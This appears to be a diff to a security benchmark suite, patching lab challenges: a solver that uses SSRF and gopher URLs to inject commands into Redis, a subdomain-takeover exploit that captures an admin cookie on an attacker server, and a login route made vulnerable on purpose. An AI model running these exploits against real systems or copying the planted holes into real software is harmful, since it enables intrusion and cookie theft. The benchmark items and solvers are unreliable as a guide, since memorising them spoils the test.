@@ -1,0 +1,250 @@
+diff --git a/benchmarks/APEX-021-25/src/app/src/routes/api.js b/benchmarks/APEX-021-25/src/app/src/routes/api.js
+index 4d1d4dc..c828d39 100644
+--- a/benchmarks/APEX-021-25/src/app/src/routes/api.js
++++ b/benchmarks/APEX-021-25/src/app/src/routes/api.js
+@@ -10,6 +10,18 @@ const router = express.Router();
+ // Redis client for legitimate API usage
+ let redisClient = null;
+
++let flagSeeded = false;
++async function seedFlagCache(client) {
++    if (flagSeeded) {
++        return;
++    }
++    const flag = process.env.FLAG;
++    if (flag) {
++        await client.set('redpick:flag', flag);
++    }
++    flagSeeded = true;
++}
++
+ async function getRedisClient() {
+     if (!redisClient) {
+         redisClient = createClient({
+@@ -18,9 +30,16 @@ async function getRedisClient() {
+         redisClient.on('error', err => console.error('Redis Client Error', err));
+         await redisClient.connect();
+     }
++    await seedFlagCache(redisClient);
+     return redisClient;
+ }
+
++// Warm the cache so the SSRF/gopher Redis command-injection path has a
++// deterministic application-owned secret to retrieve.
++setTimeout(() => {
++    getRedisClient().catch(err => console.error('Redis flag seed failed', err.message));
++}, 1000);
++
+ /**
+  * GET /api/cache/:key
+  * Get a value from Redis cache
+diff --git a/benchmarks/APEX-021-25/src/exploit/solve.py b/benchmarks/APEX-021-25/src/exploit/solve.py
+index dec6316..0efa415 100755
+--- a/benchmarks/APEX-021-25/src/exploit/solve.py
++++ b/benchmarks/APEX-021-25/src/exploit/solve.py
+@@ -183,9 +183,11 @@ class RedisSSRFExploit:
+         if not self.test_ssrf():
+             return
+
+-        # Phase 2: Test internal Redis
++        # Phase 2: Test internal Redis. Redis does not speak HTTP, so this
++        # probe is only an optional hint; the authoritative test is the
++        # gopher/RESP PING below.
+         if not self.test_redis_access():
+-            return
++            self.info("HTTP Redis probe inconclusive; continuing with gopher RESP test...")
+
+         # Phase 3: Test gopher
+         if not self.test_gopher():
+@@ -203,12 +205,22 @@ class RedisSSRFExploit:
+                 print(f"    {line}")
+             print()
+
+-        # Phase 5: Try Lua EVAL
+-        self.info("Attempting RCE via Lua EVAL...")
+-        result = self.exploit_lua_eval("cat /flag")
++        # Phase 5: Read the app-owned flag seeded into Redis.
++        # The upstream RCE path used io.popen from Redis Lua, but Redis 7 does
++        # not expose the io global and the /flag file lives in the app
++        # container, not Redis. This keeps the intended SSRF -> gopher ->
++        # Redis command-injection objective executable.
++        self.info("Warming application Redis cache...")
++        try:
++            requests.get(f"{self.target}/api/cache/__warmup__", timeout=5)
++        except Exception:
++            pass
++
++        self.info("Reading redpick:flag through Redis GET via gopher...")
++        result = self.send_ssrf(self.build_gopher_url(["GET", "redpick:flag"]))
+
+         if result:
+-            self.info(f"EVAL result: {result[:200]}")
++            self.info(f"Redis GET result: {result[:200]}")
+
+             # Check for flag
+             if "FLAG{" in result or "flag{" in result:
+@@ -222,15 +234,7 @@ class RedisSSRFExploit:
+                     print("=" * 60)
+                     return match.group(0)
+
+-        # Phase 6: Alternative methods
+-        self.info("\nLua EVAL may be sandboxed. Alternative methods:")
+-        print("  1. CONFIG SET + SAVE (write webshell)")
+-        print("  2. SLAVEOF (data exfiltration)")
+-        print("  3. MODULE LOAD (if enabled)")
+-        print()
+-
+-        self.info("Try manually with these payloads:")
+-        print(f"\n  INFO: {self.build_gopher_url('INFO')[:80]}...")
++        self.error("Redis command injection worked, but redpick:flag was not returned")
+
+         return ""
+
+diff --git a/benchmarks/APEX-027-25/src/attacker-server/src/index.js b/benchmarks/APEX-027-25/src/attacker-server/src/index.js
+index 1fe82a7..7303130 100644
+--- a/benchmarks/APEX-027-25/src/attacker-server/src/index.js
++++ b/benchmarks/APEX-027-25/src/attacker-server/src/index.js
+@@ -3,7 +3,7 @@ const fs = require('fs').promises;
+ const path = require('path');
+
+ const app = express();
+-const PORT = process.env.PORT || 6666;
++const PORT = process.env.PORT || 8080;
+ const LOOT_PATH = '/data/loot';
+
+ // Store all captured data
+diff --git a/benchmarks/APEX-027-25/src/docker-compose.yml b/benchmarks/APEX-027-25/src/docker-compose.yml
+index 1242611..1a04089 100644
+--- a/benchmarks/APEX-027-25/src/docker-compose.yml
++++ b/benchmarks/APEX-027-25/src/docker-compose.yml
+@@ -58,6 +58,7 @@ services:
+         aliases:
+           - cloudstore.local
+           - apex-corp-assets.cloudstore.local
++          - assets.apex-corp.local
+
+   # ============================================================================
+   # Admin Bot - Simulates admin user browsing, carries session with FLAG
+@@ -69,7 +70,7 @@ services:
+       args:
+         FLAG: ${FLAG:-FLAG{test_flag_replace_me}}
+     environment:
+-      - MAIN_APP_URL=http://main-app:3000
++      - MAIN_APP_URL=http://apex-corp.local:3000
+       - FLAG=${FLAG:-FLAG{test_flag_replace_me}}
+       - HEADLESS=true
+     depends_on:
+@@ -87,9 +88,9 @@ services:
+     build:
+       context: ./attacker-server
+     ports:
+-      - "6666:6666"
++      - "8080:8080"
+     environment:
+-      - PORT=6666
++      - PORT=8080
+     volumes:
+       - attacker-loot:/data/loot
+     networks:
+diff --git a/benchmarks/APEX-027-25/src/exploit/solve.py b/benchmarks/APEX-027-25/src/exploit/solve.py
+index bdb59df..34a4d61 100755
+--- a/benchmarks/APEX-027-25/src/exploit/solve.py
++++ b/benchmarks/APEX-027-25/src/exploit/solve.py
+@@ -10,7 +10,7 @@ import time
+ import uuid
+ import subprocess
+ import sys
+-from urllib.parse import quote
++from urllib.parse import quote, unquote
+
+ class SubdomainTakeoverExploit:
+     def __init__(self, target_url, cloud_url, attacker_url, dns_server="localhost", dns_port=5353):
+@@ -21,6 +21,7 @@ class SubdomainTakeoverExploit:
+         self.dns_port = dns_port
+         self.owner_token = str(uuid.uuid4())
+         self.takeover_bucket = None
++        self.takeover_subdomain = "assets.apex-corp.local"
+
+     def discover_subdomains(self):
+         """Discover subdomains from target application"""
+@@ -161,8 +162,8 @@ class SubdomainTakeoverExploit:
+         """Submit URL to admin via report feature"""
+         print("\n[*] Phase 4: Triggering admin visit...")
+
+-        # Use the cloud provider URL that serves from our bucket
+-        takeover_url = f"{self.cloud_url}/bucket/{self.takeover_bucket}/"
++        # Visit the claimed bucket through the dangling apex-corp.local subdomain
++        takeover_url = f"http://{self.takeover_subdomain}:4000/bucket/{self.takeover_bucket}/index.html"
+
+         print(f"[*] Submitting URL: {takeover_url}")
+
+@@ -192,11 +193,14 @@ class SubdomainTakeoverExploit:
+                     print(f"\n[+] ===== COOKIE CAPTURED =====")
+                     cookies = data.get('cookie') or data.get('cookies', '')
+                     print(f"[+] Raw: {cookies[:200]}...")
++                    decoded_cookies = unquote(cookies)
++                    if decoded_cookies != cookies:
++                        print(f"[+] Decoded: {decoded_cookies[:200]}...")
+
+                     # Extract FLAG
+-                    if 'FLAG{' in cookies:
++                    if 'FLAG{' in decoded_cookies:
+                         import re
+-                        flag_match = re.search(r'FLAG\{[^}]+\}', cookies)
++                        flag_match = re.search(r'FLAG\{[^}]+\}', decoded_cookies)
+                         if flag_match:
+                             print(f"\n[+] !!!!! FLAG FOUND !!!!!")
+                             print(f"[+] {flag_match.group(0)}")
+@@ -231,6 +235,7 @@ class SubdomainTakeoverExploit:
+             if cname:
+                 # Extract bucket name from CNAME
+                 # e.g., apex-corp-assets.cloudstore.local -> apex-corp-assets
++                self.takeover_subdomain = subdomain
+                 bucket_name = cname.split('.')[0]
+
+                 # Step 3: Check if bucket is claimable
+@@ -253,7 +258,7 @@ class SubdomainTakeoverExploit:
+ def main():
+     target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
+     cloud = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:4000"
+-    attacker = sys.argv[3] if len(sys.argv) > 3 else "http://localhost:6666"
++    attacker = sys.argv[3] if len(sys.argv) > 3 else "http://localhost:8080"
+
+     exploit = SubdomainTakeoverExploit(target, cloud, attacker)
+     result = exploit.run()
+diff --git a/benchmarks/APEX-027-25/src/main-app/src/routes/auth.js b/benchmarks/APEX-027-25/src/main-app/src/routes/auth.js
+index 86fc85a..9987ac5 100644
+--- a/benchmarks/APEX-027-25/src/main-app/src/routes/auth.js
++++ b/benchmarks/APEX-027-25/src/main-app/src/routes/auth.js
+@@ -45,6 +45,18 @@ router.post('/login', (req, res) => {
+     loginTime: new Date().toISOString()
+   };
+
++  if (user.role === 'admin' && user.flag) {
++    // Intentionally vulnerable benchmark behavior: expose the admin flag in a
++    // readable parent-domain cookie so a taken-over subdomain can steal it.
++    res.cookie('apex_admin_flag', user.flag, {
++      domain: process.env.COOKIE_DOMAIN || '.apex-corp.local',
++      path: '/',
++      httpOnly: false,
++      secure: false,
++      maxAge: 24 * 60 * 60 * 1000
++    });
++  }
++
+   console.log(`[AUTH] User logged in: ${username} (role: ${user.role})`);
+
+   if (user.role === 'admin') {
+diff --git a/benchmarks/APEX-035-25/src/db/init.sql b/benchmarks/APEX-035-25/src/db/init.sql
+index 891a014..59dee33 100644
+--- a/benchmarks/APEX-035-25/src/db/init.sql
++++ b/benchmarks/APEX-035-25/src/db/init.sql
+@@ -16,7 +16,7 @@ CREATE TABLE products (
+
+ -- Orders table
+ CREATE TABLE orders (
+-    id SERIAL PRIMARY KEY,
++    id UUID PRIMARY KEY,
+     user_id VARCHAR(100) NOT NULL,
+     product_id INTEGER REFERENCES products(id),
+     quantity INTEGER DEFAULT 1,
